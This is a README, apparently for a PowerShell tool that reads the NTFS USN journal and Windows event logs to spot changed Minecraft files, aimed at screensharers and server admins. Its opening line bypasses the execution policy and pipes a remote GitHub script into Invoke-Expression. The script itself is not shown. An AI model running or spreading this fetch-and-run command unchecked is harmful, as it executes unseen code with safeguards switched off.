**`powershell Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass && powershell Invoke-Expression (Invoke-RestMethod https://raw.githubusercontent.com/usnjournal/read-journal/refs/heads/main/read-journal.ps1)`**

🛠️ **USN Journal Tracker Tool**
A PowerShell utility for monitoring file system changes using the NTFS USN Journal — ideal for tracking Minecraft world saves, mod changes, deleted files, and more.

🔍 **Features**

 - 📁 **NTFS File Activity Scanning**
   - Reads real-time USN journal entries
   - Tracks file creation, deletion, and modification
   - Detects altered game data (e.g. `saves/`, `mods/`, `config/`)
   - Lightweight, single-file script

 - 📊 Filtered Log Reading
   - Supports `System`, `Application`, `Security`, and custom logs
   - Filters by:
      - Event severity (`Error`, `Warning`, `Information`)
      - Time window (`-LastHours`)
      - Specific keywords or sources

📤 **Export Capabilities**
 - Optional CSV export
 - Data ready for Excel/log analysis
 - Table format in PowerShell console

🔎 **Minecraft Use Case**
 - Detects:
   - Auto-save triggers
   - World corruption patterns
   - Mod file modifications
   - Unexpected deletions or overwrites
 - Supports offline and server-based tracking

🖥️ **System Requirements**
 - PowerShell 5.1+
 - Windows 10/11 or Server
 - Admin privileges recommended (especially for Security log)

🧠 **Ideal For**
 - Minecraft players & screensharer
 - Server admins monitoring data integrity
 - Developers tracking file-level behavior
 - Digital forensics & system event audits


⚠️ **Disclaimer**
 - Tool is for **personal and educational use only**
 - Do not use for unauthorized monitoring
 - May require elevated privileges for full access
`**Author is not responsible for any misuse of this tool.**`

🛡️ **Security**
 - No external data sent or received
 - Runs locally on your machine
 - Fully open-source and inspectable

👥 **Credits**
 - Developed by **usnjournal.** & **onlynelchilling**

`**Not affiliated with Mojang Studios or Microsoft.**`
